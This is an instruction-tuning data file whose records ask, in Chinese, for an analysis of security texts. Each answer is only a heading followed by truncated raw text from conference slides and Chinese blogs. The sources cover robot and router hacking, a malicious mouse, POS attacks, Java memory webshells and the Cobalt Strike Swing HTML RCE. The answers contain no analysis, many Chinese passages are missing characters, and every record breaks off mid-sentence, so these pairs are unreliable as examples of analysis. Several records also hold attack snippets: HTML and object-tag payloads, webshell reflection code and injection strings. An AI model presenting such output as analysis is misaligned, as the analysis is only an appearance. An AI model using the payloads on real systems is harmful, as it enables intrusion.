{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nVacuum Cleaning Security Pinky and the Brain Edition Jiska Classen Secure Mobile Networking Lab - SEEMOO Technische Universität Darmstadt, Germany Fabian Ullrich IT Security Analyst @ ERNW GmbH Heidelberg, Germany 2  A vacuum cleaning robot is in your house, has access to your Wi-Fi and knows many of your personal habits.  Who of you owns a vacuum cleaning robot?  (Own as it's YOUR robot, neither your neighbor's nor someone's on the Internet!) Motivation 3  A vacuum cleaning robot is in your house, has access to your Wi-Fi and knows many of your personal habits.  Who of you owns a vacuum cleaning robot?  Neato is one of the top vacuum cleaning robot models in the US.  In Germany, Vorwerk has been selling vacuum cleaners forever (founded 1883). Their top model, a robot, is a rebranded Neato.  Vorwerk won the test comparisons in Germany with their VR300/VR200. Motivation 4  Robots were harmed during our experiments! (Sorry for that)  No customer data was leaked.  Neato was informed and fixed all issues in time. Responsible Disclosure 5 Infrastructure & Security Features UI & USB console 6 Infrastructure & Security Features UI & USB console Manual robot commands 7 Infrastructure & Security Features Beehive UI & USB console Manual robot commands Setup only Account information 8 Infrastructure & Security Features Nucleo Beehive UI & USB console Manual robot commands Setup only ?? Robot commands / status Account information Robot commands, status responses 9 Infrastructure & Security Features Nucleo Beehive  HTTPS  RSA key (robotcloud) ??  HTTPS  Secure boot  Encrypted logs  Signed firmware updates  HTTPS  RSA key (robotcloud)  Secret key (robotuser)  HTTPS  Secret key (robotuser)  Secret key (robotuser) 10  With all these security features, what could possibly go wrong? Contributions 11  With all these security features, what could possibly go wrong?  We bypass secure boot on a vacuum cleaning robot to extract its memory.  Our key findings are   key findings!  And a QNX ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nIf You Give A Mouse A Microchip It will execute a payload and cheat at your high-stakes video game tournament Mark Williams (skud) and Rob Stanley (Sky)  1958 - first video game  1972 - first recorded, sponsored video game tournament  Spacewar! - built in 1960s  Rolling Stone sponsored a Spacewar! Olympics in 72 Competitive Gaming Esports The International 2016  Teams from all over the world  20 million dollar prize pool (19 million crowd funded)  17,000 people watching at the venue  Over five million people watching online Esports  Massive temporary networks  Hot-seat computers  Internet connectivity  Support player-owned peripherals Security Challenges at Esports Events Computers at events typically close these attack vectors:  Internet access restricted  Player accounts dont have admin  Drivers / configs pre-installed  USB Mass Storage disabled  Extra USB ports disabled But you can plug your own mouse and keyboard into the PC! Potential Attack Vector  Found a mouse with an overpowered microcontroller  Not enough scrutiny over devices at esports tournaments Why Hack with a Mouse? Gaming Mouse Gaming Mouse  STMicro STM32F103CB Microcontroller  ARM Cortex M3microprocessor  Supports ST-Link programming interface  128KB Flash Memory  Stores user profiles onboard - save your dpi settings!  Lots of buttons  RGB LEDs 1. Connect to microcontroller built into the mouse. 2. Insert code to act as USB Keyboard. 3. Send keystrokes to execute payload on target computer 4. Unplug the keyboard app, run original mouse code 5. ??? 6. Profit Responsible disclosure Without obvious physical modifications to the mouse Hijack the Microcontroller Frequently Asked Question: Wait, isnt that just a Rubber Ducky in a mouse? Hang on a second ??? STMicro STM32F4 Discovery Development board  Has an onboard ARM Cortex M4 for initial dev  Has an external programming interface to program mouse Mouse with a ARM cortex processor Soldering Iron Wires Hardware Tools Used  STM32 ST-Link Utility  System", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n@M4x_1997 @zh_explorer  Beijing Chaitin Tech Co., Ltd(@ChaitinTech) https://chaitin.cn/en https://realworldctf.com/  Chaitin Security Research Lab  Pwn2Own 2017 3rd place  GeekPwn 2015/2016/2018/2019 awardees  PS4 Jailbreak, Android rooting, IoT Offensive Research, ESXi Escape  CTF players from team b1o0p, Tea Deliverers  2nd place at DEFCON 2016  3rd place at DEFCON 2019  1st place at HITCON 2019  4st place at DEFCON 2020  Ranks 422nd on the Fortune Global 500 list for 2020  Hosts the worlds largest IoT platform  Xiaomi today has more than 235 million connected devices  Released on February 13, 2020  The first router to support Wi-Fi 6 of Xiaomi  599 / 99$  Wi-Fi 6  A logical error is a bug in a program that causes it to operate incorrectly, but not to terminate abnormally (or crash)  Logical bugs are hard to find but relatively easy to exploit  We will elaborate more by examples  Web server 80/8080/8098/8999  DNS (53)  Other protocol 784 Nmap scan report for 192.168.31.1 Host is up (0.0052s latency). Not shown: 65528 closed ports PORT STATE SERVICE VERSION 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.12 (Ubuntu Linux) 80/tcp open http nginx 1.12.2 784/tcp open unknown 8080/tcp open http nginx 1.12.2 8098/tcp open http nginx 1.12.2 8999/tcp open http nginx 1.12.2  Web server 80/8080/8098/8999  DNS (53)  Other protocol 784 A little spoiler alert: All web functions are completed in lua. And most luac files are encrypted in Xiaomis own format. Common ways:  Dump the flash sniffer from network traffic when updating  get a shell from serial connection ssh/telnet Nday/0day attack etc.  Social engineering, especially for Xiaomi IoT devices http://miwifi.com/miwifi_download.html Seems its a UBI image, but we encounter the error when trying to extract it using ubi_reader Reading the code of ubi_reader, we find there is an extra data block at the end of the image. Ps: this issue is fixed in commit 63105 Now we have firmware  alias defines a replacement for the specified locat", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nAttacking the Traveling Salesman Point-of-sale attacks on airline travelers DEFCON 2014 Alex Zacharis Nikos Tsagkarakis info@census-labs.com Census S.A. http://census-labs.com/ Contents  Why target travelers?  Point-of-Sale attacks in transportation  Case Study  Back to the Lab  POS: exploiting different modules  Cameras everywhere  Scan that QR  RAM scrapping  TS POS Malware  Aztec Revenge Tool Why target travelers?  The need for communication is greater than privacy and/or security  The unknown Internet access landscape forces you to trust what you normally wouldnt  WiFi:  Login to (corporate) email accounts  Login to social networks  Carry mobile phones, tablets, laptops ,usually all on at the same time ;)  No second thoughts about public Internet hotspots Point-of-Sale attacks in Transportation Unlike traditional POS attacks in Commerce (ex. Target Incident):  Credit card details  Web credentials We target International Travelers' information:  Name  Picture  Flight number  Destination  Seat number  Communication partners  Other_. How is the POS introduced As in every known POS Attack (Retail, Healthcare, etc): 1. The system may have unpatched vulnerabilities 2. An employee of the victim company may introduce it by mistake (opening an email attachment containing malware) 3. The source might even be an employee looking to cause trouble. POS attack outcome Who benefits? Cyber Criminals (Identity theft) Private Investigators (spying) Government Agencies (spying) After a successful attack we can achieve: Travelers profiling without authorized access to Airport Data With enough data collected we can categorize travelers per:  Destination (ex. Who travelled from Greece to Germany in the last month)  Company (ex. All Aegean passengers)  Class (ex. Who is travelling 1rst class OR Business)  Flight/Date (ex. All passengers of a specific flight)  Combination of the above POS Systems Present What are the possible POS Systems of interest? - Check-in kiosks - Purchase WiFi t", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n从0开始的src之旅-开篇 0x00 前 由职业真的是有顿没顿不做点啥就焦虑做了事不赚钱也焦虑 anyway作为安全从业能不上班赚外块的除了拉条就剩src了之前说过想要搞搞src但 直拖着没怎么产出其实也不是没有尝试主要是我也是个菜可能写些有的没得容易 误导别所以我希望看这些字的不要把这个当作教科书是当作个和你样的菜从零开 始步步的思考和实践记录 我五六年前也挖过阵src那么多年过去了很多东变了很多东没变要想重新投 状态到src中我需要去总结不变的东优化迭代那些变化了的东 这个开篇主要是把些前期的想法罗列下并不涉及具体的实施 0x01 意 要完成个标先我们要先确这个标这听起来像是废话因为我们的标是挖src呀这 确实没有错但是这个太笼统了不好下先拆成个的阶段性标 1. 筛选国内外src平台寻找合适的家熟悉他们的规则和相应漏洞的价格 2. 搭建套合适的信息搜集和漏洞扫描的平台并持续的进打磨 3. 针对性的挖掘如业务逻辑漏洞越权复杂的rce等 4. 第个可以不赚钱后每个最少要赚两万温饱费 好了先简单罗列这条相对具体点的实现路径和kpi 0x02 梳理派系 在具体开始前我们还需要梳理下赏猎的派系什么是派系呢这其实是我对些向 的分类因为不可能所有向都很侧重所以我们先要知道有哪些向其次再强化擅的 向以及通过动化等式来保底那些不擅的向 地域和业划分 先按照地域划分可以粗暴的划分为国内和国外两派这不是说国外多好或者国内多差是不 同的国家地域所有的基础建设和态不同这会导致整体技术栈都不相同国外也可以细分成各 个国家每个国家本企业可能会的技术栈都有所不同举个例可能你就明了如 国内hw打的起来的那些四OA深信服vpn天擎等在国外就基本看不到如果你要打国外 的src的商的基础资产你可能需要打cisco等这并不是意味着cisco就逼是想说明点 态不同意味着攻击向不同 业的划分也是如此不同国家不同领域的业所基础设施也会不同那么相应的通组建漏 洞就不太样了就如fastjson国外就少国内就很多 事件型与通型 事件型和通型其实在漏洞法就有过区分简单来说前者是标家的专属漏洞如它的业务 逻辑漏洞web越权等甚是某台VPN未打补丁因此存在1day漏洞这些都属于这个src商的事 件漏洞通常src挖掘也都是事件漏洞 通型漏洞就是通常所指的各种通产品组建框架的0day这些产品框架有些也会有专属src 或者平台价收购0day所以这也是种bugbounty 这就会带来两种不同的挖掘思路 1. 事件型就像是hw打点重在搜集家信息和扫描挖掘各种逻辑漏洞和1day利 2. 通型重在产品的代码审计和进制挖掘等 当然这两者在有些时候也会交叉在起少我们在挖掘前应该先分清楚偏向于哪类 基础漏洞与RCE 为什么我要专这样做区分呢 前我将事件型漏洞挖掘作hw打点其实是不完全的hw打点其实是事件型漏洞挖掘的个 集事件型漏洞挖掘还包含有各种那些不起眼的基础漏洞如反射型XSSID越权遍历任意 账户找回免费领活动短信验证码爆破等也就是说分清楚是像chybeta样只爱RCE 呢还是做个越权XSS来恰五百的烂钱呢这其实是个很重要的定位 src总额最才是硬道理技术含量并不重要因此不要有技术偏好只是要搞清楚哪个适合  0x03 我的定位 我的话可能会国内国外都搞搞国内的话就挑两家如sxf国外则在h1或者bugcrowd上找 家然后对于挖掘向应该是先实现套半动的事件型漏洞挖掘的平台然后再将部分注意 放在通型产品的审计上 0x04 明确家要求 作为挖掘初期要做的事情就是阅读每个src的规则列表这常重要每家规则可能都会有些差 异这其中包括对于某些漏洞的验证上如ssrf的验证可能会提供个标域名你只有指定访 问该域名的ssrf才是有效的如有些src不收xssCSRFDoS等不仅仅是国内家国外也 很多家明确不收甚于超出scope也律不收所以在没有阅读规则前就去挖洞很容易 提交后被忽略因此如果规则上明确了不收取就不要费劲去挖掘然后掰扯 0x05 基础设施构想 有了定位后开始重头戏也就是基础设施的构思 因为我们需要套半动的平台做src挖掘的撑那么就需要去考虑该平台体构成有哪些基 本上还是采搭积的式通过选型开源的组件然后在做些粘合和微创新 信息搜集 信息搜集其实是个常的块时半会讲也讲不完不过前来说最基本的就个 1. 域名信息搜集 2. 端扫描 3. github等敏感信息泄漏 前来看初步定在个arl灯塔来做基础的信息平台oneforall等脚本做补充的域名信息搜集 通扫描器 扫描器的选择基本就三个nucleixrayawvs 这三个都可以扫描通漏洞和框架漏洞前两个容易做底层集成awvs可能作为单独部署的额外 扫描 爆破模块 爆破是事件型漏洞的精华所在当你没有思路的时候就祭出爆破出奇迹准没错爆破的话 主要有个东要爆破 1. h", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n1 As-Exploits内存兼容Spring 前 过程 关于反射的坑 addServletMapping的兼容性问题 运截图 最后 @yzddmr6 最近在对As-Exploits的内存部分做兼容Spring处理原来只是照搬了哥斯拉的些payload现在需要 深研究下了 先要Spring中默认没有pageContext的依赖所以相关的依赖部分都要去除蚁剑的jsp很早就不依赖 pageContext了相关章以前也写过不知道的同学可以翻翻我的博客 在研究过程中可以发现哥斯拉中的payload基本都是反射实现的这样的好处就是可以不添加任何依赖 这也是为什么哥斯拉只有8m的原因 去除掉所有的pageContext后在Spring中获取servlet没有问题但是卸载的时候报了个错误 前 过程 关于反射的坑 1 public String unLoadServlet() { 2 if (wrapperName != null && wrapperName.length() > 0 && ur lPattern != null && urlPattern.length() > 0) { 3 try { 4 Object o = getFieldValue(this.request.getServletC ontext(), \"context\"); 5 Field field = o.getClass().getDeclaredField(\"cont ext\"); 6 field.setAccessible(true); 7 Object standardContext = getFieldValue(o, \"contex t\"); 2 内存管理模块报了个这样的错误 8 Object wrapper = this.invoke(standardContext, \"fi ndChild\", wrapperName); 9 Class containerClass = Class.forName(\"org.apache. catalina.Container\", false, standardContext.getClass().getClassLo ader()); 10 if (wrapper != null) { 11 standardContext.getClass().getDeclaredMethod( \"removeChild\", containerClass).invoke(standardContext, wrapper); 12 this.invoke(standardContext, \"removeServletMa pping\", urlPattern); 13 if (this.getMethodByClass(wrapper.getClass(), \"setServlet\", Servlet.class) == null) { 14 this.transform(standardContext, urlPatter n); 15 } 16 17 return \"ok\"; 18 } else { 19 return \"not find wrapper\"; 20 } 21 } catch (Exception var8) { 22 return var8.getMessage(); 23 } 24 } else { 25 return \"wrapperName or urlPattern is Null\"; 26 } 27 } 1 15e0d5bERROR:// java.lang.NoSuchMethodException: org.springframewo rk.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org. apache.catalina.Container)adc1b2c 3 定位下问题出在这 意思就是在StandardContext中找不到removeChild这个法 调试下发现Spring中获取到的StandardContext示例为其个类叫做 TomcatEmbeddedContext虽然Spring中内置了Tomcat但这个是Spring特有的 TomcatEmbeddedContext继承了StandardContext并且没有对removeChild进改写如果类有这 个法应该是可以调的 开始以为是Spring在StandardContext中删掉了此法结果翻到类StandardContext发现跟普通的 Tomcat样调的org.apache.catalina.core.ContainerBase#removeChild", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n2012 Presented by: Pwning you(r) cyber offenders Piotr Duszynski @drk1wi  2012 ;WHOAMI;#?  Senior Security Consultant @Trustwave (OSCE, OSCP, )  In security field for the past 6 years, hacking since 9   Enjoys security research, crazy road trips and good music  Lives and works in Warsaw (Poland) 2  2012 What is this presentation about? 1. Annoyance and Camouflage New defensive technique that renders your attackers port scan results nearly useless  2. Active (Offensive) Defense New attack vectors against you(r) attackers offensive toolbox   POC DEMO: example exploit for one of the well known scanners. 3 Active Defense in practice  2012  2012 To blind attackers tools The art of Annoyance and Camouflage  2012 A typical reconnaissance phase  Standard case scenario (target system is behind a Firewall) 5 # nmap -sV -O portspoof.org  2012 Portspoof  implementation of the idea 6 What if (worst case scenario):  All 65535 ports appear to be open  *Portspoof will bind to a single port  On every open port there appears to be a service listening *Portspoof will dynamically generate valid service signatures ~ 8000 supported TASK: Get a precise state of all running services  2012 Spicing up the reconnaissance phase with Portspoof  Worst case scenario (target system is behind the Portspoof) : 7 $ nmap sV -p - -PN portspoof.org . Will require a lot of patience!  2012 Spicing up attackers port scan results 8 Scanning statistics: 65.535 open ports (services) ~120 MB of sent data 30682 s (8.5h) and few beers later   2012 Spicing up attackers port scan results 9  2012 Spicing up attackers port scan results 10  and somewhere in the results you can find the hidden message   2012 Spicing up attackers port scan results  NMAP OS identification results 11 $ nmap sV -O portspoof.org  2012 Spicing up attackers port scan results  NMAP OS identification results: 12 Device type: general purpose Running (JUST GUESSING): Linux 3.X (93%) OS CPE: cpe:/o:linux:linux_kernel:3 Aggressive OS guesses: Linu", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n记次CS RCE曲折的复现路 0x00 前 就在前天敌的北少爷向CS官提交了个RCE漏洞通过该漏洞可以在捕获攻击者的beacon后 向teamserver发送包含xss的数据经过反射后最终在攻击者的client上执RCE该漏洞编号为CVE- 2022-39197可这是个可遇不可求的反制客的神洞安服仔的噩梦既然是暴打jb的漏洞 那定要复现下于是我下定决燃烧精元死命肝在群友的持下终于跌跌撞撞的完整的复现了 该漏洞回过头来看这天真是学了的东 0x01 起点 相信家在这都已经过了插img标签来获取个反弹的get请求如 在UI组件写 <html><img src=x> 就会得到这样的效果 这是个demo的java swing的代码在jlabel我直接输了payload就会得到个渲染失败的图学过 基础的xss的都知道这就是个html的img标签渲染失败的样这也意味着如果填了远程地址就会对 远程服务器发送get请求这也是这天最常的基础利 那么这是为什么呢没错这就是swing种java GUI的库带的特性也是切的起点 我们直接歌搜索swing html第条就是官教你如何在swing使html标 签 https://docs.oracle.com/javase/tutorial/uiswing/components/html.html 看到没档直接告诉我们个事实在内容的开头插 <html> 标签后续的内容就会被格式化为html 档进解析也就是说持html标签 这有个关键点就是at the beginning of the text也就是说必须是开头插 <html> 才这个点很关 键记下 部分鲁特们看到这可能就很显然的认为既然持html标签了那是不是直接套套XSS那套就可以 RCE了这么看来北也没什么了不起我直接插个 <script>alert(1)</script> <script>window.open('file://xxxx/calc.exe')</script> 想怎么弹怎么弹甚还能引外部js件进更多的XSS2RCE这个漏洞没什么了不起不过是他北 发现了这个特性罢了 很显然事情没有那么简单甚复杂度超出你的想象 0x02 swing的html解析器 但凡盲测过也都会发现其实script标签是不效的不仅仅是script标签很多标准的标签在swing这个场 景或多或少都受到些功能限制那么要实现RCE的话突破点在哪呢这时候我们就需要从swing 的代码寻找答案了 打开jdk的rt.jar包我们可以定位到swing的包内容 接下来就是在swing找答案了 可以看到带了个套的html解析器我们打开那个HTML啥的类随便看看 会定义堆常的html标签和属性有标签定义那定有标签解析之类的东太多我也不是常看得 懂我就概挑个点说下先是他定义了标签和对应的action 如我们熟悉的link标签 会关联到linkaction 会专判断rel是不是stylesheet是的话可以使href去引外部的css但是如果你去查link持的属性 还会发现标准持堆的type会有堆的骚操作但是在这他只有这两个type实际测下来是有 反应的 从注释和代码我们也能看到script标签是不持的这其实写的也不太对但是少可以说明这些标 签不是不持就是功能有残缺实际上也是如此 然后再来看另段 在HTMLEditorKit的create法可以看到不同的标签会对应到创建不同的view 这重点来了先看这个object标签这是个啥呀我们跟进去看看 通过阅读注释我们可以了解到这个objectview体上就是可以实例化个符合要求的类并且通过param 进参数传递 这有股天然的反序列化的味道了因此这是RCE的个极可能的突破点围绕这个object标签我们可以 做的事情突然就从弹图开始突破到了实例化任意类 先来看看后续的代码 明显的反射调并且实例化类这要注意的是他还加了个限制判断也就是实例必须继承与 Component否则就抛出异常这也限制了我们所能操作的范围 我们继续跟setParameters看看是怎么传递参数的 总结下来就是 1. classid传需要实例化的类类必须继承与Component 2. 必须有参构造法貌似是因为newinstant是调的参构造法 3. 必须存在个setXXX法的XXX属性 4. setXXX法的传参数必须是接受个string类型的参数 因此找到符合上述条件的类和属性接着看实例化后能做啥事即可 如我们可以简单的来测试个 可以看到jlabel有参数构造法并且有setText的满条件的属性 那么我们可以构造 <html><object classid='javax.swing.JLabel'><parame name='Text' value='hahaha'> 那其实就变成了从", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nRevealing Embedded Fingerprints: Deriving intelligence from USB stack interactions Andy Davis, Research Director NCC Group Image from: p1fran.com UK Offices Manchester - Head Ofﬁce Cheltenham Edinburgh Leatherhead London Thame North American Offices San Francisco Atlanta New York Seattle Australian Offices Sydney European Offices Amsterdam - Netherlands Munich  Germany Zurich - Switzerland Agenda Part One:  Overview of the USB enumeration phase  Different USB stack implementations  USB testing platform  Installed drivers and supported devices  Fingerprinting USB stacks and OS versions Part Two:  The Windows 8 RNDIS kernel pool overflow  Challenges faced when exploiting USB bugs  Conclusions Part One: Information gathering  Why do we care?  If you connect to a device surely you already know the platform?  Embedded devices are mostly based on Linux anyway aren't they?  May provide information useful for other attacks USB Background stuff Image from: blog.brickhousesecurity.com Overview of the USB enumeration phase  What is enumeration for?  Assign an address  Speed of communication  Power requirements  Configuration options  Device descriptions  Class drivers  Lots of information exchange  implemented in many different ways Image from :http://ewalk2.blog117.fc2.com The USB enumeration phase Enumeration phase peculiarities  Why is the device descriptor initially requested twice?  Why are there multiple requests for other descriptors?  Class-specific descriptors: Different USB stack implementations  Typical components of a USB stack  Windows USB driver stack  Linux USB stack  Embedded Access USB stack Image from: blogs.msdn.com Typical components of a USB stack  Host Controller hardware  USB System software:  Host Controller Driver  Hardware Abstraction Layer  USB Driver  Class drivers  Application software Image from: www.wired.com Windows USB driver stack Image from: msdn.microsoft.com Linux USB stack Image from: www.linux-usb.org Embedded Access USB stack Image from:", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nYOU ARE NOT HIDING FROM ME .NET! FOUR THINGS ABOUT MYSELF Netflix addict Attack detection blogger Threat Hunter @ Countercept Code junkie THE AGENDA Detect Why .NET ? IN THE NOT SO DISTANT PAST PowerShell VBScript Office Macros POWERSHELL, A HOT FAVOURITE Load shellcode into memory Call upon .NET API Call upon native API Powerful DEFENCES ARE GETTING BETTER EDR AGENTS Command Line Arguments Logging CommandLine powershell write host This is an evil command Parent-Child Process Relationship DEFENCES ARE GETTING BETTER AMSI assisting Anti-Virus with script-based detection PowerShell Script Block Logging to aid with detection INDUSTRY AS A WHOLE More opportunities to detect bad PowerShell ADVERSARIES JUST DONT GIVE UP Invoke .NET directly instead of via PowerShell WHY .NET THOUGH? Powerful functions Installed by default Lack of telemetry 10 LETS COMPARE POWERSHELL AND .NET Write a registry key through a .NET API Pop a Message box with a native API 11 POWERSHELL VS .NET DEMO POWERSHELL VS .NET HOW DID I EXECUTE MY .NET PAYLOAD? In-memory assembly loading IN MEMORY .NET ASSEMBLY LOADING Compile Serialize Load into memory De-serialize Instantiate A FUN FACT This does exactly the same thing WHAT CAN THE LOADED OBJECT DO? Load shellcode into memory Call upon .NET API Call upon native API Similar to PowerShell MID-POINT CHECK Challenge: Can we detect this? Similar to PowerShell Lack of telemetry THE AGENDA Detect Why .NET ?  WITH PROCESS HACKER Process Hacker Mshta.exe Analyze DETECTING .NET LOADED DLLS Loading of .NET runtime DLLs can be observed DEFINITELY DODGY MSHTA typically only runs HTML or JavaScript code! HOLDS TRUE FOR OTHER BINARIES WHAT IF A BINARY RELATED TO .NET WAS USED Msbuild.exe 3rd Party Application Not uncommon to have .NET runtime DLL WE NEED SOMETHING BETTER And the answer lies deep within Process Hacker .NET ASSEMBLIES Events of assembly loads .NET ASSEMBLIES Lack of a path indicates potential in-memory assembly loads .NET ASSEMBLIES How did Process Hac", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nZero Bugs Found? Hold My Beer AFL! How to Improve Coverage-guided Fuzzing and Find New Zero-days in Tough Targets Maksim Shudrak Security Researcher Salesforce DEF CON 27 About me  Offensive Security Researcher at Salesforce Red Team  Projects:  EAOS: Extremely Abstract Operating System for Malware Analysis (at IBM Research 2015-2017)  drAFL: AFL + DynamoRIO = fuzzing binaries with no source code on Linux (spare time) https://github.com/mxmssh/drAFL  Contributions: drltrace, winAFL, DynamoRIO, DrMemory, Ponce  PhD on vulnerability research in machine code  Speaker: 3 Outline I. Introduction II. What is coverage-guided fuzzing ? III. Downsides of AFL and similar fuzzers IV. Introducing Manul V. DEMO VI. Case Studies + Vulnerabilities VII. Conclusion & Future Work 4 What is Fuzzing? 5 AAAAA What is Fuzzing? 6 AAAAA What is Fuzzing? 7 BAAAA What is Fuzzing? 8 CAAAA What is Fuzzing? 9 PAAAA What is Fuzzing? 10 PWNIT What is Fuzzing? 11 PWNIT Very unlikely! What is Coverage-Guided Fuzzing? 12 AAAAA What is Coverage-Guided Fuzzing? 13 AAAAA What is Coverage-Guided Fuzzing? 14 BAAAA What is Coverage-Guided Fuzzing? 15 CAAAA What is Coverage-Guided Fuzzing? 16 PAAAA What is Coverage-Guided Fuzzing? 17 AAAAA PAAAA Input queue What is Coverage-Guided Fuzzing? 18 AAAAA PBAAA Input queue What is Coverage-Guided Fuzzing? 19 AAAAA PCAAA Input queue What is Coverage-Guided Fuzzing? 20 AAAAA PWAAA Input queue What is Coverage-Guided Fuzzing? 21 AAAAA PAAAA Input queue PWAAA What is Coverage-Guided Fuzzing? 22 AAAAA PAAAA Input queue PWBAA What is Coverage-Guided Fuzzing? 23 AAAAA PAAAA Input queue PWNAA What is Coverage-Guided Fuzzing? 24 AAAAA PAAAA Input queue PWNAA PWNBA What is Coverage-Guided Fuzzing? 25 AAAAA PAAAA Input queue PWNAA PWNIA What is Coverage-Guided Fuzzing? 26 AAAAA PAAAA Input queue PWNAA PWNIA PWNIB What is Coverage-Guided Fuzzing? 27 AAAAA PAAAA Input queue PWNAA PWNIA PWNIC What is Coverage-Guided Fuzzing? 28 AAAAA PAAAA Input queue PWNAA PWNIA PWNIT America", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n1 Security Advisory: Banks Security (Web) Militan.c7 PDF created with pdfFactory Pro trial version www.pdffactory.com 2 DEMO1 PDF created with pdfFactory Pro trial version www.pdffactory.com 3  function focusWin() {window.focus();  window.location.href = \"http://www.banksa.com.au/business/busin ess-banking-online/user- guide/?source=applet&origin=CBS\"\"; //document.write(\"http://www.banksa.com.au /business/business-banking-online/user- guide/?source=applet&origin=CBS\"\"); } window.onload = focusWin; PDF created with pdfFactory Pro trial version www.pdffactory.com DEMO2 Hack bank 4 PDF created with pdfFactory Pro trial version www.pdffactory.com 5  result = expression1 & expression2  FillForm & Response.write(\"ccccc\")   FillForm & Response.write(\"ccccc\") %0d%0a Response.write(\"kerker\") ' PDF created with pdfFactory Pro trial version www.pdffactory.com 6 Introduction  Bank Web sites full of security holes, University of Michigan survey finds  Comments: this data is outdated. PDF created with pdfFactory Pro trial version www.pdffactory.com 7 Banks in Taiwan  Exploit  Error message  No  Strip  Full of Error  Information Disclosure PDF created with pdfFactory Pro trial version www.pdffactory.com Response(Not ALL)  We`re SECUUURRRRREEE EEEE!!! You dxmn hacker! Ask for accusation, huh? Fxck! PDF created with pdfFactory Pro trial version www.pdffactory.com Q:SxCK HACKER! A:Im not cracker. Q:我們已經掌握你的姓名,mail跟單位! A:是我寄給你的.. Q:保安~!保安~! A: 9 PDF created with pdfFactory Pro trial version www.pdffactory.com Forget it. I`m so kind. 10 PDF created with pdfFactory Pro trial version www.pdffactory.com 11 <?  $sql=\"select * from vvvvv where a='\".$a.\"' and b=\".$b.\" and passwd=password('$passwd') \";  $_SESSION[b']=$b; $_SESSION[adminlogin']=True\"; mysql_close($link); header(\"location: ccccc.php\"); }else{ mysql_close($link); header(\"location: ddddd.php\"); } ?> PDF created with pdfFactory Pro trial version www.pdffactory.com 12 Press Release  xx銀行採用xx解決方案提供Web內容與應用的 安全防護與控管功能並大幅加快員工網路應用 存取時間", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nBattery Firmware Hacking Charlie Miller Accuvant Labs charlie.miller@accuvant.com @0xcharlie About me Former US National Security Agency researcher First to hack the iPhone and G1 Android phone Winner of CanSecWest Pwn2Own: 2008, 2009, 2010, 2011 Author Fuzzing for Software Security Testing and Quality Assurance The Mac Hackers Handbook PhD, CISSP, GCFA, etc. Something different http://www.youtube.com/watch?v=jjAtBiTSsKY Agenda Basics on smart batteries systems A journey into a MacBooks batterys (lack of) security mechanisms Potential impact Smart battery Safety is a primary design goal in the Smart Battery System speciﬁcations. The central concept behind the Smart Battery speciﬁcations is locating the primary intelligence of the system inside the battery pack itself. This enables the system to be much more accurate in measurement of battery parameters such as remaining capacity and design voltage, and also allows the charging algorithm and parameters to be tuned to the battery packs speciﬁc chemistry. By relying on the battery packs intelligence, a properly designed Smart Battery system will safely charge and discharge any expected battery chemistry. - Smart Battery System Speciﬁcations document Smart batteries Have an embedded controller which communicate with the charger and host Has a responsibility to maintain safety Can be conﬁgured for different parameters/chemistries Possible Battery Attacks Brick battery on victim Reprogram to remove safety features and allow explosion (thermal runaway)??? Persistent DOS to OS Persistent backdoor to OS (requires kernel bug) TPM, BIOS sniffer Spoiler I didnt blow up batteries Didnt do too much twiddling of parameters in my house Would like to continue to take my laptop on airplanes Might be able to take this work and do it How to start I suck at hardware, so look for associated software Battery updater Lots of calls to a function that basically wraps IOConnectMethodStructure IsStructure This is a function which passes data t", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nMysteries of the Phone System Past and Present Patrick McNeil @unregistered436 Owen @LinuxBlog Views and opinions are those of Patrick & Owen and do not represent past, present, or future employers. All Service Marks, Trademarks, and Copyrights belong to their respective owners. \"Get this and get it straight Crime is a suckers road, and those who travel it wind up in the gutter, the prison, or the grave.\" -Opening of the Philip Marlowe radio show The Original Philip Marlowe - Humphrey Bogart from The Big Sleep,1946 (46 / 2 = 23) Why are we doing this?  Phreaks as the original electronics hackers  Its a way of thinking...  VoIP wasnt designed for security  Mysteries of the past can help you understand the present - let us be your guide What well cover History Info Leakage Exploitation Fraud & Abuse PoC Tool Demo Other Which may include famous movie stars and propaganda User Dialing  Strowger switch - alternating current pulses & mechanical cylinder switch per digit  First user dialing enabled - exchange name converted to number to dial in small area Carrier Growth Drives Innovation  Burgeoning operator workforce growth  Panel & Crossbar common control built number in sender then processed  The 4A crossbar and card control POP QUIZ!  Q: SF and MF - what tone critical? XXXX Hz?  Q: What was the design flaw that revolutionized the industry? Its TRUE mom, the DEF CON Goons are SO dreamy! Introducing Asterisk! Asterisk Created in 1999 - Now developed by Digium - GPL - Latest Stable: 13.0.0 (24 October 2014; 4 months ago) - 11.13.1 (20 October 2014; 4 months ago) Numerous Books published - 2005 - Building Telephony Systems with Asterisk (PACKT) - 2007 - Asterisk for dummies published - 2007 - Asterisk Hacking published - AsteriskBook (AsteriskDocs.org) AMI AGI (http://www.voip-info.org/wiki/view/Asterisk+AGI) You can do some cool stuff with it. Asterisk variants... FreePBX Asterisk@Home TrixBox PBX In 